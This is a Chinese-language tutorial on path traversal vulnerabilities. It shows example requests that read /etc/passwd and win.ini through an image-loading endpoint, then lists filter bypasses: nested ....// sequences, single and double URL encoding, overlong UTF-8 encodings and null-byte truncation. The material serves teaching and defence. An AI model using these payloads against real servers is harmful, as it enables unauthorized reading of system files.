文件路径遍历漏洞是Web应用中常见的安全问题之一，攻击者可以通过该漏洞读取服务器上的任意文件。本文将详细介绍文件路径遍历漏洞的原理以及常见的绕过防护措施的方法。
## 通过路径遍历读取任意文件
某购物应用通过 `<img>` 标签加载商品图片，代码如下：
```html
<img src="/loadImage?filename=218.png">
```
`loadImage` 接口通过 `filename` 参数指定文件名，从 `/var/www/images/` 目录读取文件并返回内容，构造的文件路径为：
```
/var/www/images/218.png
```
### 攻击原理
该应用未对路径遍历攻击做防护，攻击者可利用此漏洞。例如，请求以下URL：
```html
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```
此时文件路径变为：
```
/var/www/images/../../../etc/passwd
```
`../` 表示向上一级目录移动，连续三个 `../` 使路径从 `/var/www/images/` 跳转到文件系统根目录，最终读取的文件是：
```
/etc/passwd
```
在 Unix 系统中，该文件包含服务器注册用户信息。攻击者可利用相同技术读取其他任意文件。
### Windows系统情况
在Windows系统中，`../` 和 `..\` 都是有效的目录遍历序列。例如：
```html
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```
这将读取 `C:\windows\win.ini` 文件。
## 绕过路径遍历漏洞防护的常见方法
### 1. 使用绝对路径
如果应用未对绝对路径做限制，可直接指定文件路径，例如：
```html
https://example.com/loadImage?filename=/etc/passwd
```
### 2. 嵌套遍历序列
利用嵌套的遍历序列绕过简单过滤，例如：
```html
https://example.com/loadImage?filename=....//....//etc//passwd
```
或混合使用正反斜杠：
```html
https://example.com/loadImage?filename=....\/....\/etc\/passwd
```
### 3. URL编码与双重编码
在某些情况下，例如在 URL 路径或 `multipart/form-data` 请求的 `filename` 参数中，Web 服务器可能会在将输入传递给应用程序之前去除任何目录遍历序列。
所以，可对 `../` 进行URL编码或双重编码绕过过滤：
- 单层编码：`%2e%2e%2f`
- 双重编码：`%252e%252e%252f`
- 非标准编码：`..%c0%af` 或 `..%ef%bc%8f`
### 4. 路径规范化绕过
利用路径规范化特性构造有效路径，例如：
```html
https://example.com/loadImage?filename=/var/www/images/../../../etc/passwd
```
### 5. 满足文件名要求的绕过
#### 5.1 以特定目录开头
如果要求文件名必须以 `/var/www/images` 开头，可构造：
```html
https://example.com/loadImage?filename=/var/www/images/../../../etc/passwd
```

#### 5.2 以特定扩展名结尾
如果要求文件名必须以`.png`结尾，可使用空字节截断：
```html
https://example.com/loadImage?filename=../../../etc/passwd%00.png
```
